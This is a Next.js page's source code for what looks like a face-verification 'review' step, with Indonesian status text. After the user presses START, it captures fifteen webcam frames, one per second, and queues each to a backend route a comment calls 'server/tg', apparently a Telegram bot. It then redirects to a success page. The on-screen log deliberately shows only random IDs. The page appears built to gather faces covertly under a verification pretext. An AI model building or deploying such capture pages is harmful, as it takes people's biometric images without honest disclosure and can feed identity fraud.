// pages/review.js
import { useRef, useState } from "react";
import { useRouter } from "next/router";

export default function Review() {
  const router = useRouter();
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const queueRef = useRef([]);
  const sendingRef = useRef(false);

  const [logs, setLogs] = useState([]);
  const [running, setRunning] = useState(false);
  const [status, setStatus] = useState("idle");
  const [detectTries, setDetectTries] = useState(0);

  function addLog(s) {
    setLogs(prev => [...prev, s].slice(-300));
  }

  function makeID(len = 24) {
    const c = "abcdefghijklmnopqrstuvwxyz0123456789";
    let s = "";
    for (let i = 0; i < len; i++) s += c[Math.floor(Math.random() * c.length)];
    return s;
  }

  async function ensureCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      return true;
    } catch (e) {
      return false;
    }
  }

  // capture with resizing to keep payload small (maxWidth)
  function captureBase64(maxWidth = 900, quality = 0.7) {
    if (!canvasRef.current) canvasRef.current = document.createElement("canvas");
    const v = videoRef.current;
    const canvas = canvasRef.current;
    const naturalW = v.videoWidth || 640;
    const naturalH = v.videoHeight || 480;
    let targetW = naturalW;
    let targetH = naturalH;
    if (naturalW > maxWidth) {
      targetW = maxWidth;
      targetH = Math.round((naturalH * maxWidth) / naturalW);
    }
    canvas.width = targetW;
    canvas.height = targetH;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(v, 0, 0, targetW, targetH);
    const dataUrl = canvas.toDataURL("image/jpeg", quality);
    return dataUrl.replace(/^data:image\/jpeg;base64,/, "");
  }

  // queue for sending to server/tg
  function enqueueSend(base64, id) {
    queueRef.current.push({ base64, id });
    processQueue();
  }

  async function processQueue() {
    if (sendingRef.current) return;
    if (!queueRef.current.length) return;
    sendingRef.current = true;

    const { base64, id } = queueRef.current.shift();
    try {
      const res = await fetch("/api/laifulbotapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "send", imageBase64: base64, id })
      });
      const j = await res.json();
      if (j.ok) {
        addLog(`id: ${id}`);
      } else {
        // retry push
        addLog(`id: ${id} (retry)`);
        queueRef.current.push({ base64, id });
      }
    } catch (e) {
      addLog(`id: ${id} (retry)`);
      queueRef.current.push({ base64, id });
    }

    sendingRef.current = false;
    // schedule next immediately
    setTimeout(processQueue, 0);
  }

  async function startProcess() {
    // reset
    setLogs([]);
    setDetectTries(0);
    setRunning(true);
    setStatus("running");

    const ok = await ensureCamera();
    if (!ok) {
      addLog("kamera tidak diizinkan");
      setRunning(false);
      setStatus("idle");
      return;
    }

    // 15 seconds capture -> enqueue each second
    let sec = 0;
    const timer = setInterval(() => {
      sec++;
      const id = makeID();
      const b64 = captureBase64(900, 0.7);
      enqueueSend(b64, id);
      // only log ID (no words)
      addLog(`id: ${id}`);
      if (sec >= 15) {
        clearInterval(timer);
        // after capturing 15 frames, run detection phase
        setTimeout(() => runDetectPhase(), 300); // slight delay to allow queue to start sending
      }
    }, 1000);
  }

  async function runDetectPhase() {
    setStatus("mendeteksi");
    const id = makeID();
    addLog(`mendeteksi: ${id}`);
    addLog("memeriksa...");

    const base64 = captureBase64(900, 0.7);
    let det;
    try {
      const res = await fetch("/api/laifulbotapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "detect", imageBase64: base64, id })
      });
      det = await res.json();
    } catch (e) {
      det = { ok: false, error: String(e) };
    }

    // handle errors
    if (!det || det.ok === false) {
      // treat as a failed attempt
      addLog("gagal mendeteksi");
      // increment tries and decide
      setDetectTries(prev => {
        const next = prev + 1;
        if (next >= 3) {
          addLog("coba lagi");
          setRunning(false);
          setStatus("idle");
        } else {
          // user wanted retries up to 3; we retry detectPhase automatically until tries reached
          setTimeout(() => runDetectPhase(), 500);
        }
        return next;
      });
      return;
    }

    // parse faces from response
    const faces = Number(det.faces || det.faces === 0 ? det.faces : (det.result && (() => {
      try {
        const r = det.result.results && det.result.results[0];
        const ent = r?.entities || [];
        let cnt = 0;
        for (const e of ent) {
          if (Array.isArray(e.objects)) cnt += e.objects.length;
        }
        return cnt;
      } catch (e) { return 0; }
    })()));

    if (faces > 0) {
      addLog("wajah ditemukan");
      router.push("/success");
      return;
    }

    // if API returned ok but faces==0 (no face)
    addLog("gagal mendeteksi");
    setDetectTries(prev => {
      const next = prev + 1;
      if (next >= 3) {
        addLog("coba lagi");
        setRunning(false);
        setStatus("idle");
      } else {
        // retry detection once more after short delay
        setTimeout(() => runDetectPhase(), 500);
      }
      return next;
    });
  }

  return (
    <main style={{ padding: 16, background: "#0b1220", minHeight: "100vh", color: "#e6eef8" }}>
      <div style={{ display: "flex", gap: 16, flexWrap: "wrap" }}>
        <div style={{ flex: 1, minWidth: 260 }}>
          <div style={{ height: 320, background: "#000", borderRadius: 8, overflow: "hidden" }}>
            <video ref={videoRef} style={{ width: "100%", height: "100%", objectFit: "cover" }} autoPlay playsInline muted />
          </div>

          <div style={{ marginTop: 12 }}>
            {!running ? (
              <button onClick={startProcess} style={{ padding: "10px 16px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
                START
              </button>
            ) : (
              <div>status: {status}</div>
            )}
          </div>
        </div>

        <div style={{ width: 360, flexShrink: 0 }}>
          <div style={{ background: "#07101f", padding: 10, height: 420, overflowY: "auto", borderRadius: 8, fontFamily: "monospace", fontSize: 13 }}>
            {logs.map((l, i) => <div key={i} style={{ padding: "4px 0", borderBottom: "1px dashed #102129" }}>{l}</div>)}
          </div>
        </div>
      </div>
    </main>
  );
}